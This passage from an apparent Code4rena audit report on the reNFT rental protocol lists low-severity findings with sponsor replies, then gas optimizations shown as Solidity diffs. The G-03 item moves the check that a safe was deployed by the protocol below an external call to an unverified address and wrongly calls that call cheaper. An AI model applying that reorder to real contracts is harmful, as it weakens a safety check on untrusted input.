Contrary to the docs [which state](https://github.com/code-423n4/2024-01-renft/blob/main/docs/hooks.md#:~:text=When%20signing%20a%20rental%20order%2C%20the%20lender%20can%20decide%20to%20include%20an%20array%20of%20Hook%20structs%20along%20with%20it.%20These%20are%20bespoke%20restrictions%20or%20added%20functionality%20that%20can%20be%20applied%20to%20the%20rented%20token%20within%20the%20wallet.) that the hooks are controlled by the lender - in reality all active on-transaction hooks run regardless of what the lender has specified in the order.

## [L-04] - Limit the rental to a reasonable time, to prevent creating for an unreasonable time by mistake
Currently it seems that the protocol allows rental for thousands of years, that doesn’t make much sense and if a user specifies that by mistake that might lock their tokens forever.


## [L-05] - Can’t update the status of a self destructed hook

The protocol doesn't allow updating the status of hooks with no code.
The issue is that if a hook is self destructed for any reason the admin can't update its status any more.

[code](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L318-L319)
```solidity
        if (hook.code.length == 0) revert Errors.StorageModule_NotContract(hook);
```

As mitigation - if the hook doesn't have any code allow only disabling it (setting the status to zero).

## [L-06] - If stop policy is replaced it’d brick the rental stop for older safes
The stop policy can be replaced via the kernel, if the old stop policy is disabled it'd be impossible to stop the rentals - since only the old stop policy has access to the safe.

As mitigation - either keep the old stop policy active, or add some migration mechanism (allowing the old stop policy to add the new stop policy to the safe as a module. This has to be done before deploying the current stop policy).

## [R-01] - `Accumulator._insert()` might result in memory collision in future code
This function expands the size of the `rentalAssets` memory variable, assuming there's no memory that's currently used afterwards.
This is true under current code, but worth keeping an eye on it for future code changes or upgrades - if there's another memory variable after `rentalAssets` when this function is called it'd override it, causing severe issues.

[Code](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Accumulator.sol#L81-L83)
```solidity
            // Update the free memory pointer so that memory is safe
            // once we stop doing dynamic memory array inserts
            mstore(0x40, add(newItemPosition, 0x40))
```

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/330#issuecomment-1908959716):**
 > L1- Acknowledged.<br>
> L2- Acknowledged.<br>
> L3- Disputed, this is expected behavior.<br>
> L4- Confirmed.<br>
> L5- Acknowledged, hook implementations considered out of scope.<br>
> L6- Disputed, policies can only be enabled or disabled. in this instance, a second stop policy would be created for users to opt-in to.<br>
> 
> R1- Acknowleged.

***

# Gas Optimizations

For this audit, 9 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-01-renft-findings/issues/560) by **0xAnah** received the top score from the judge.

*The following wardens also submitted reports: [slvDev](https://github.com/code-423n4/2024-01-renft-findings/issues/601), [SAQ](https://github.com/code-423n4/2024-01-renft-findings/issues/569), [mgf15](https://github.com/code-423n4/2024-01-renft-findings/issues/608), [shamsulhaq123](https://github.com/code-423n4/2024-01-renft-findings/issues/580), [0xhex](https://github.com/code-423n4/2024-01-renft-findings/issues/572), [0xta](https://github.com/code-423n4/2024-01-renft-findings/issues/570), [sivanesh\_808](https://github.com/code-423n4/2024-01-renft-findings/issues/554), and [0x11singh99](https://github.com/code-423n4/2024-01-renft-findings/issues/516).*

## Introduction
Highlighted below are optimizations exclusively targeting state-mutating functions and view/pure functions invoked by state-mutating functions. In the discussion that follows, only runtime gas is emphasized, given its inevitable dominance over deployment gas costs throughout the protocol's lifetime. 

Please be aware that some code snippets may be shortened to conserve space, and certain code snippets may include @audit tags in comments to facilitate issue explanations."

## [G-01] Avoid Reading and writing to state if amount is zero

### 4 Instances

1. ### Refactor `PaymentEscrow._decreaseDeposit()` to avoid state read/write if `amount` is zero
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L294

In the `PaymentEscrow._decreaseDeposit()` function as shown below checks should be implemented to avoid  reading and writing to state if the `amount` argument is zero this is because if `amount` is 0 the statement `balanceOf[token] -= amount` would not change the value of `spenderAllowance` since its being decremented by zero. This then means that in scenarios where `amount` is 0 the statement `balanceOf[token] -= amount` is re-assigning the same value to state i.e there is no state change. Also its important to note that the `_settlePayment()` function that invokes this function does note implement this check before the invocation. The diff below shows how the function should be refactored:

<details>

```solidity
file: src/modules/PaymentEscrow.sol

292:    function _decreaseDeposit(address token, uint256 amount) internal {
293:        // Directly decrease the synced balance.
294:        balanceOf[token] -= amount;
295:    }
```
```diff
diff --git a/src/modules/PaymentEscrow.sol b/src/modules/PaymentEscrow.sol
index 34c4f4c..d90f184 100644
--- a/src/modules/PaymentEscrow.sol
+++ b/src/modules/PaymentEscrow.sol
@@ -291,7 +291,10 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {
      */
     function _decreaseDeposit(address token, uint256 amount) internal {
         // Directly decrease the synced balance.
-        balanceOf[token] -= amount;
+        if (amount > 0){
+            balanceOf[token] -= amount;
+        }
+
     }
```
```
Estimated gas saved: 5000 gas units
```
</details>

2. ### Refactor `Storage.addRentals()` to avoid state read/write if `asset.amount` is zero
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L201

In the `Storage.addRentals()` function as shown below checks should be implemented to avoid reading and writing to state if the value of  `asset.amount` is zero this is because if `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] += asset.amount` would not change the value of `rentedAssets[asset.rentalId]` since its being incremented by zero. This then means that in scenarios where `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] += asset.amount` is re-assigning the same value to state i.e there is no state change. The diff below shows how the function should be refactored:

<details>

```solidity
file: src/modules/Storage.sol

189:    function addRentals(
190:        bytes32 orderHash,
191:        RentalAssetUpdate[] memory rentalAssetUpdates
192:    ) external onlyByProxy permissioned {
193:        // Add the order to storage.
194:        orders[orderHash] = true;
195:
196:        // Add the rented items to storage.
197:        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
198:            RentalAssetUpdate memory asset = rentalAssetUpdates[i];
199:
200:            // Update the order hash for that item.
201:            rentedAssets[asset.rentalId] += asset.amount;
202:        }
203:    }
```
```diff
diff --git a/src/modules/Storage.sol b/src/modules/Storage.sol
index 1e46bcb..b909f41 100644
--- a/src/modules/Storage.sol
+++ b/src/modules/Storage.sol
@@ -198,7 +198,10 @@ contract Storage is Proxiable, Module, StorageBase {
             RentalAssetUpdate memory asset = rentalAssetUpdates[i];

             // Update the order hash for that item.
-            rentedAssets[asset.rentalId] += asset.amount;
+            if (asset.amount > 0) {
+                rentedAssets[asset.rentalId] += asset.amount;
+            }
+
         }
     }
```
```
Estimated gas saved: 5000 gas units
```
</details>

3. ### Refactor `Storage.removeRentals()` to avoid state read/write if `asset.amount` is zero
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L233

In the `Storage.removeRentals()` function as shown below checks should be implemented to avoid reading and writing to state if the value of  `asset.amount` is zero this is because if `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] -= asset.amount` would not change the value of `rentedAssets[asset.rentalId]` since its being decremented by zero. This then means that in scenarios where `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] -= asset.amount` is re-assigning the same value to state i.e there is no state change. The diff below shows how the function should be refactored:

<details>

```solidity
file: src/modules/Storage.sol

216:    function removeRentals(
217:        bytes32 orderHash,
218:        RentalAssetUpdate[] calldata rentalAssetUpdates
219:    ) external onlyByProxy permissioned {
220:        // The order must exist to be deleted.
221:        if (!orders[orderHash]) {
222:            revert Errors.StorageModule_OrderDoesNotExist(orderHash);
223:        } else {
224:            // Delete the order from storage.
225:            delete orders[orderHash];
226:        }
227:
228:        // Process each rental asset.
229:        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
230:            RentalAssetUpdate memory asset = rentalAssetUpdates[i];
231:
232:            // Reduce the amount of tokens for the particular rental ID.
233:            rentedAssets[asset.rentalId] -= asset.amount;
234:        }
235:    }
```
```diff
diff --git a/src/modules/Storage.sol b/src/modules/Storage.sol
index 1e46bcb..b8f2248 100644
--- a/src/modules/Storage.sol
+++ b/src/modules/Storage.sol
@@ -230,7 +230,10 @@ contract Storage is Proxiable, Module, StorageBase {
             RentalAssetUpdate memory asset = rentalAssetUpdates[i];

             // Reduce the amount of tokens for the particular rental ID.
-            rentedAssets[asset.rentalId] -= asset.amount;
+            if (asset.amount > 0) {
+                rentedAssets[asset.rentalId] -= asset.amount;
+            }
+
         }
     }
```
```
Estimated gas saved: 5000 gas units
```
</details>

4. ### Refactor `Storage.removeRentalsBatch()` to avoid state read/write if `asset.amount` is zero
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L264

In the `Storage.removeRentalsBatch()` function as shown below checks should be implemented to avoid reading and writing to state if the value of  `asset.amount` is zero this is because if `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] -= asset.amount` would not change the value of `rentedAssets[asset.rentalId]` since its being decremented by zero. This then means that in scenarios where `asset.amount` is 0 the statement `rentedAssets[asset.rentalId] -= asset.amount` is re-assigning the same value to state i.e there is no state change. The diff below shows how the function should be refactored:

<details>

```solidity
file: src/modules/Storage.sol

244:    function removeRentalsBatch(
245:        bytes32[] calldata orderHashes,
246:        RentalAssetUpdate[] calldata rentalAssetUpdates
247:    ) external onlyByProxy permissioned {
248:        // Delete the orders from storage.
249:        for (uint256 i = 0; i < orderHashes.length; ++i) {
250:            // The order must exist to be deleted.
251:            if (!orders[orderHashes[i]]) {
252:                revert Errors.StorageModule_OrderDoesNotExist(orderHashes[i]);
253:            } else {
254:                // Delete the order from storage.
255:                delete orders[orderHashes[i]];
256:            }
257:        }
258:
259:        // Process each rental asset.
260:        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
261:            RentalAssetUpdate memory asset = rentalAssetUpdates[i];
262:
263:            // Reduce the amount of tokens for the particular rental ID.
264:            rentedAssets[asset.rentalId] -= asset.amount;
265:        }
266:    }
```
```diff
diff --git a/src/modules/Storage.sol b/src/modules/Storage.sol
index 1e46bcb..677656c 100644
--- a/src/modules/Storage.sol
+++ b/src/modules/Storage.sol
@@ -261,7 +261,10 @@ contract Storage is Proxiable, Module, StorageBase {
             RentalAssetUpdate memory asset = rentalAssetUpdates[i];

             // Reduce the amount of tokens for the particular rental ID.
-            rentedAssets[asset.rentalId] -= asset.amount;
+            if (asset.amount > 0) {
+                rentedAssets[asset.rentalId] -= asset.amount;
+            }
+
         }
```
```
Estimated gas saved: 5000 gas units
```
</details>

## [G-02]  Pre-calculate equations which contain only constant values in constructor
For equations, calcuations and computations that only involve constants or immutable values they could be calculated in the contract's constructor and saved to an immutable variable. Using the immutable variable would be cheaper than performing the calculation every time the function is called.

### 3 Instances

1. ### Save `toKeycode("STORE")` computation to an Immutable variable
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L48-#L49
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L73
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L77
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L80-#L81


The free function `toKeycode()` converts a `bytes5` value into a `Keycode` type and returns the `Keycode` value. Calling `toKeycode()` on a constant `bytes5` value would always return the same `Keycode` value therefore calling `toKeycode("STORE")` would always result in the same value. So  having to call `toKeycode("STORE")` multiple times in the `configureDependencies()` and `requestPermissions()` functions isn't gas efficient rather we should make the call in the constructor then save the returned value to an immutable variable then the immutable variable be used in place of `toKeycode("STORE")` in functions that invokes it. The diff below shows howthe code should be refactored:

<details>

```solidity
file: src/policies/Admin.sol

40:    function configureDependencies()
41:        external
42:        override
43:        onlyKernel
44:        returns (Keycode[] memory dependencies)
45:    {
46:        dependencies = new Keycode[](2);
47:
48:        dependencies[0] = toKeycode("STORE");  //@audit toKeycode("STORE")
49:        STORE = Storage(getModuleAddress(toKeycode("STORE")));  //@audit toKeycode("STORE")
50:
51:        dependencies[1] = toKeycode("ESCRW");
52:        ESCRW = PaymentEscrow(getModuleAddress(toKeycode("ESCRW")));
53:    }
.
.
.
64:    function requestPermissions()
65:        external
66:        view
67:        override
68:        onlyKernel
69:        returns (Permissions[] memory requests)
70:    {
71:        requests = new Permissions[](8);
72:        requests[0] = Permissions(
73:            toKeycode("STORE"),  //@audit toKeycode("STORE")
74:            STORE.toggleWhitelistExtension.selector
75:        );
76:        requests[1] = Permissions(
77:            toKeycode("STORE"),  //@audit toKeycode("STORE")
78:            STORE.toggleWhitelistDelegate.selector
79:        );
80:        requests[2] = Permissions(toKeycode("STORE"), STORE.upgrade.selector);  //@audit toKeycode("STORE")
81:        requests[3] = Permissions(toKeycode("STORE"), STORE.freeze.selector);  //@audit toKeycode("STORE")
82:
83:        requests[4] = Permissions(toKeycode("ESCRW"), ESCRW.skim.selector);
84:        requests[5] = Permissions(toKeycode("ESCRW"), ESCRW.setFee.selector);
85:        requests[6] = Permissions(toKeycode("ESCRW"), ESCRW.upgrade.selector);
86:        requests[7] = Permissions(toKeycode("ESCRW"), ESCRW.freeze.selector);
87:    }
```
```diff
diff --git a/src/policies/Admin.sol b/src/policies/Admin.sol                                
index b37d47f..d19a99c 100644                                                               
--- a/src/policies/Admin.sol                                                                
+++ b/src/policies/Admin.sol                                                                
@@ -20,13 +20,16 @@ contract Admin is Policy {                                              
     // Modules that the policy depends on.                                                 
     Storage public STORE;                                                                  
     PaymentEscrow public ESCRW;                                                            
+    Keycode immutable storeKeycode;                                                        
                                                                                            
     /**                                                                                    
      * @dev Instantiate this contract as a policy.                                         
      *                                                                                     
      * @param kernel_ Address of the kernel contract.                                      
      */                                                                                    
-    constructor(Kernel kernel_) Policy(kernel_) {}                                         
+    constructor(Kernel kernel_) Policy(kernel_) {                                          
+        storeKeycode = toKeycode("STORE");                                                 
+    }                                                                                      
                                                                                            
     /**                                                                                    
      * @notice Upon policy activation, configures the modules that the policy depends on.  
@@ -45,8 +48,8 @@ contract Admin is Policy {                                                
     {                                                                                      
         dependencies = new Keycode[](2);                                                   
                                                                                            
-        dependencies[0] = toKeycode("STORE");                                              
-        STORE = Storage(getModuleAddress(toKeycode("STORE")));                             
+        dependencies[0] = storeKeycode;                                                    
+        STORE = Storage(getModuleAddress(storeKeycode));                                   
                                                                                            
         dependencies[1] = toKeycode("ESCRW");                                              
         ESCRW = PaymentEscrow(getModuleAddress(toKeycode("ESCRW")));                       
@@ -70,15 +73,15 @@ contract Admin is Policy {                                              
     {                                                                                      
         requests = new Permissions[](8);                                                   
         requests[0] = Permissions(                                                         
-            toKeycode("STORE"),                                                            
+            storeKeycode,                                                                  
             STORE.toggleWhitelistExtension.selector                                        
         );                                                                                 
         requests[1] = Permissions(                                                         
-            toKeycode("STORE"),                                                            
+            storeKeycode,
             STORE.toggleWhitelistDelegate.selector
         );
-        requests[2] = Permissions(toKeycode("STORE"), STORE.upgrade.selector);
-        requests[3] = Permissions(toKeycode("STORE"), STORE.freeze.selector);
+        requests[2] = Permissions(storeKeycode, STORE.upgrade.selector);
+        requests[3] = Permissions(storeKeycode, STORE.freeze.selector);

         requests[4] = Permissions(toKeycode("ESCRW"), ESCRW.skim.selector);
         requests[5] = Permissions(toKeycode("ESCRW"), ESCRW.setFee.selector);
```

</details>

### Apply the same changes to these Instances in the `Create`, `Factory`, `Guard` and `Stop` Contracts.

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L80-#L81

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L104

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L81-#L82

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L102

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L71-#L72

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L92-#L93

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L71-#L72

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L95-#L96

2. ### Save `toKeycode("ESCRW")` computation to an Immutable variable
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L51-#L52
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L83-#L86

The free function `toKeycode()` converts a `bytes5` value into a `Keycode` type and returns the `Keycode` value. Calling `toKeycode()` on a constant `bytes5` value would always return the same `Keycode` value therefore calling `toKeycode("ESCRW")` would always result in the same value. So  having to call `toKeycode("ESCRW")` multiple times in the `configureDependencies()` and `requestPermissions()` functions isn't gas efficient rather we should make the call in the constructor then save the returned value to an immutable variable then the immutable variable be used in place of `toKeycode("ESCRW")` in functions that invokes it. The diff below shows howthe code should be refactored:

<Details>

```solidity
file: src/policies/Admin.sol

40:    function configureDependencies()
41:        external
42:        override
43:        onlyKernel
44:        returns (Keycode[] memory dependencies)
45:    {
46:        dependencies = new Keycode[](2);
47:
48:        dependencies[0] = toKeycode("STORE");  
49:        STORE = Storage(getModuleAddress(toKeycode("STORE")));
50:
51:        dependencies[1] = toKeycode("ESCRW");    //@audit toKeycode("ESCRW")
52:        ESCRW = PaymentEscrow(getModuleAddress(toKeycode("ESCRW"))); //@audit toKeycode("ESCRW")
53:    }
.
.
.
64:    function requestPermissions()
65:        external
66:        view
67:        override
68:        onlyKernel
69:        returns (Permissions[] memory requests)
70:    {
71:        requests = new Permissions[](8);
72:        requests[0] = Permissions(
73:            toKeycode("STORE"),
74:            STORE.toggleWhitelistExtension.selector
75:        );
76:        requests[1] = Permissions(
77:            toKeycode("STORE"),
78:            STORE.toggleWhitelistDelegate.selector
79:        );
80:        requests[2] = Permissions(toKeycode("STORE"), STORE.upgrade.selector);
81:        requests[3] = Permissions(toKeycode("STORE"), STORE.freeze.selector);
82:
83:        requests[4] = Permissions(toKeycode("ESCRW"), ESCRW.skim.selector);  //@audit toKeycode("ESCRW")
84:        requests[5] = Permissions(toKeycode("ESCRW"), ESCRW.setFee.selector);  //@audit toKeycode("ESCRW")
85:        requests[6] = Permissions(toKeycode("ESCRW"), ESCRW.upgrade.selector);  //@audit toKeycode("ESCRW")
86:        requests[7] = Permissions(toKeycode("ESCRW"), ESCRW.freeze.selector);  //@audit toKeycode("ESCRW")
87:    }
```
```diff
diff --git a/src/policies/Admin.sol b/src/policies/Admin.sol
index b37d47f..d2ae37b 100644
--- a/src/policies/Admin.sol
+++ b/src/policies/Admin.sol
@@ -20,13 +20,15 @@ contract Admin is Policy {
     // Modules that the policy depends on.
     Storage public STORE;
     PaymentEscrow public ESCRW;
-
+    Keycode immutable escrwKeycode;
     /**
      * @dev Instantiate this contract as a policy.
      *
      * @param kernel_ Address of the kernel contract.
      */
-    constructor(Kernel kernel_) Policy(kernel_) {}
+    constructor(Kernel kernel_) Policy(kernel_) {
+        escrwKeycode = toKeycode("ESCRW");
+    }

     /**
      * @notice Upon policy activation, configures the modules that the policy depends on.
@@ -48,8 +50,8 @@ contract Admin is Policy {
         dependencies[0] = toKeycode("STORE");
         STORE = Storage(getModuleAddress(toKeycode("STORE")));

-        dependencies[1] = toKeycode("ESCRW");
-        ESCRW = PaymentEscrow(getModuleAddress(toKeycode("ESCRW")));
+        dependencies[1] = escrwKeycode;
+        ESCRW = PaymentEscrow(getModuleAddress(escrwKeycode));
     }

     /**
@@ -80,10 +82,10 @@ contract Admin is Policy {
         requests[2] = Permissions(toKeycode("STORE"), STORE.upgrade.selector);
         requests[3] = Permissions(toKeycode("STORE"), STORE.freeze.selector);

-        requests[4] = Permissions(toKeycode("ESCRW"), ESCRW.skim.selector);
-        requests[5] = Permissions(toKeycode("ESCRW"), ESCRW.setFee.selector);
-        requests[6] = Permissions(toKeycode("ESCRW"), ESCRW.upgrade.selector);
-        requests[7] = Permissions(toKeycode("ESCRW"), ESCRW.freeze.selector);
+        requests[4] = Permissions(escrwKeycode, ESCRW.skim.selector);
+        requests[5] = Permissions(escrwKeycode, ESCRW.setFee.selector);
+        requests[6] = Permissions(escrwKeycode, ESCRW.upgrade.selector);
+        requests[7] = Permissions(escrwKeycode, ESCRW.freeze.selector);
     }
```
</details>

### Apply the same changes to these Instances in the `Create` and `Stop` Contracts.

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L83-#L84

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L105

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L74-#L75

- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L97-#L98


## [G-03] Move lesser gas costing require/revert checks to the top
Require() or Revert() statements that check input arguments or cost lesser gas should be at the top of the function.
Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting alot of gas in a function that may ultimately revert in the unhappy case.

### 2 Instances
1. ### Move `if (!ISafe(safe).isOwner(owner)) {revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe)` to the top of the function.
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L647-#L657

In the `_isValidSafeOwner()` function as shown below the if-revert statement `if (STORE.deployedSafes(safe) == 0) {revert Errors.CreatePolicy_InvalidRentalSafe(safe);}` is more gas consumimg than the if-revert statement `if (!ISafe(safe).isOwner(owner)) {revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe)` as the former reads from state which cost `2100` gas units. We can make the `_isValidSafeOwner()` function more gas efficient by moving the cheaper if-revert statement `if (!ISafe(safe).isOwner(owner)) {revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe)` to the top of the function so that in scenarios where the cheaper revert statement fails the function would revert without having to read from state which is expensive. The diff below shows how the code could be refactored:

<details>

```solidity
file: src/policies/Create.sol

647:    function _isValidSafeOwner(address owner, address safe) internal view {
648:        // Make sure only protocol-deployed safes can rent.
649:        if (STORE.deployedSafes(safe) == 0) {
650:            revert Errors.CreatePolicy_InvalidRentalSafe(safe);
651:        }
652:
653:        // Make sure the fulfiller is the owner of the recipient rental safe.
654:        if (!ISafe(safe).isOwner(owner)) {  //@audit move check to function top
655:            revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);
656:        }
657:    }
```

```diff
diff --git a/src/policies/Create.sol b/src/policies/Create.sol
index 061180d..d0eb13a 100644
--- a/src/policies/Create.sol
+++ b/src/policies/Create.sol
@@ -645,15 +645,17 @@ contract Create is Policy, Signer, Zone, Accumulator {
      * @param safe  Address of the potential protocol-deployed rental safe.
      */
     function _isValidSafeOwner(address owner, address safe) internal view {
-        // Make sure only protocol-deployed safes can rent.
-        if (STORE.deployedSafes(safe) == 0) {
-            revert Errors.CreatePolicy_InvalidRentalSafe(safe);
-        }

         // Make sure the fulfiller is the owner of the recipient rental safe.
         if (!ISafe(safe).isOwner(owner)) {
             revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);
         }
+
+        // Make sure only protocol-deployed safes can rent.
+        if (STORE.deployedSafes(safe) == 0) {
+            revert Errors.CreatePolicy_InvalidRentalSafe(safe);
+        }
+
     }
```
```
Estimated gas saved: 2100
```

</details>

2. ### Move `if (data.length < 4) {revert Errors.GuardPolicy_FunctionSelectorRequired()}` to the top of the function.
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L324-#L331

In the `checkTransaction()` function as shown below the if-revert statement `if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {revert Errors.GuardPolicy_UnauthorizedDelegateCall(to)}` is more gas consumimg than the if-revert statement `if (data.length < 4) {revert Errors.GuardPolicy_FunctionSelectorRequired()}` as the former reads from state and makes an external call which would cost at least `2200` gas units. We can make the 
`checkTransaction()` function more gas efficient by moving the cheaper if-revert statement `if (data.length < 4) {revert Errors.GuardPolicy_FunctionSelectorRequired()}` to the top of the function so that in scenarios where the cheaper revert statement fails the function would revert without having to read from state and make an external call which would be  expensive. The diff below shows how the code could be refactored:

<details>

```solidity
file: src/policies/Guard.sol

309:    function checkTransaction(
310:        address to,
311:        uint256 value,
312:        bytes memory data,
313:        Enum.Operation operation,
314:        uint256,
315:        uint256,
316:        uint256,
317:        address,
318:        address payable,
319:        bytes memory,
320:        address
321:    ) external override {
322:        // Disallow transactions that use delegate call, unless explicitly
323:        // permitted by the protocol.
324:        if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {
325:            revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);
326:        }
327:
328:        // Require that a function selector exists.
329:        if (data.length < 4) {   //@audit move check to function top
330:            revert Errors.GuardPolicy_FunctionSelectorRequired();
331:        }
.
.
.
345:    }
```
```diff
diff --git a/src/policies/Guard.sol b/src/policies/Guard.sol
index a0a565a..b8d25f9 100644
--- a/src/policies/Guard.sol
+++ b/src/policies/Guard.sol
@@ -319,16 +319,19 @@ contract Guard is Policy, BaseGuard {
         bytes memory,
         address
     ) external override {
+
+        // Require that a function selector exists.
+        if (data.length < 4) {
+            revert Errors.GuardPolicy_FunctionSelectorRequired();
+        }
+
         // Disallow transactions that use delegate call, unless explicitly
         // permitted by the protocol.
         if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {
             revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);
         }

-        // Require that a function selector exists.
-        if (data.length < 4) {
-            revert Errors.GuardPolicy_FunctionSelectorRequired();
-        }
+

         // Fetch the hook to interact with for this transaction.
         address hook = STORE.contractToHook(to);
```
```
Estimated gas saved: 2200 gas units
```

</details>

## [G-04] Cache state variables outside of loop to avoid reading storage on every iteration
Reading from storage should always try to be avoided within loops. In the following instances, we are able to cache state variables outside of the loop to save a Gwarmaccess (100 gas) per loop iteration.

### Please note these instances were not included in the bot reports.

### 5 Instances
1. ### Cache `fee` outside the loop
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L242

In the `_settlePayment()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `fee` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:

<Details>

```solidity
file: src/modules/PaymentEscrow.sol

215:    function _settlePayment(
216:        Item[] calldata items,
217:        OrderType orderType,
218:        address lender,
219:        address renter,
220:        uint256 start,
221:        uint256 end
222:    ) internal {
223:        // Calculate the time values.
224:        uint256 elapsedTime = block.timestamp - start;
225:        uint256 totalTime = end - start;
226:
227:        // Determine whether the rental order has ended.
228:        bool isRentalOver = elapsedTime >= totalTime;
229:
230:        // Loop through each item in the order.
231:        for (uint256 i = 0; i < items.length; ++i) {
232:            // Get the item.
233:            Item memory item = items[i];
234:
235:            // Check that the item is a payment.
236:            if (item.isERC20()) {
237:                // Set a placeholder payment amount which can be reduced in the
238:                // presence of a fee.
239:                uint256 paymentAmount = item.amount;
240:
241:                // Take a fee on the payment amount if the fee is on.
242:                if (fee != 0) { //@audit cache fee outside the loop
243:                    // Calculate the new fee.
244:                    uint256 paymentFee = _calculateFee(paymentAmount);
245:
246:                    // Adjust the payment amount by the fee.
247:                    paymentAmount -= paymentFee;
248:                }
.
.
.
283:    }
```
```diff
diff --git a/src/modules/PaymentEscrow.sol b/src/modules/PaymentEscrow.sol
index 34c4f4c..066d593 100644
--- a/src/modules/PaymentEscrow.sol
+++ b/src/modules/PaymentEscrow.sol
@@ -226,7 +226,7 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {

         // Determine whether the rental order has ended.
         bool isRentalOver = elapsedTime >= totalTime;
-
+        uint256 _fee = fee;
         // Loop through each item in the order.
         for (uint256 i = 0; i < items.length; ++i) {
             // Get the item.
@@ -239,7 +239,7 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {
                 uint256 paymentAmount = item.amount;

                 // Take a fee on the payment amount if the fee is on.
-                if (fee != 0) {
+                if (_fee != 0) {
                     // Calculate the new fee.
                     uint256 paymentFee = _calculateFee(paymentAmount);
```
```
Estimated gas saved: 97 gas units per iteration
```

</details>

2. ### Cache `STORE` outside the loop
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L480

In the `_addHooks()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `STORE` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:

<Details>

```solidity
file: src/policies/Create.sol

464:    function _addHooks(
465:        Hook[] memory hooks,
466:        SpentItem[] memory offerItems,
467:        address rentalWallet
468:    ) internal {
469:        // Define hook target, offer item index, and an offer item.
470:        address target;
471:        uint256 itemIndex;
472:        SpentItem memory offer;
473:
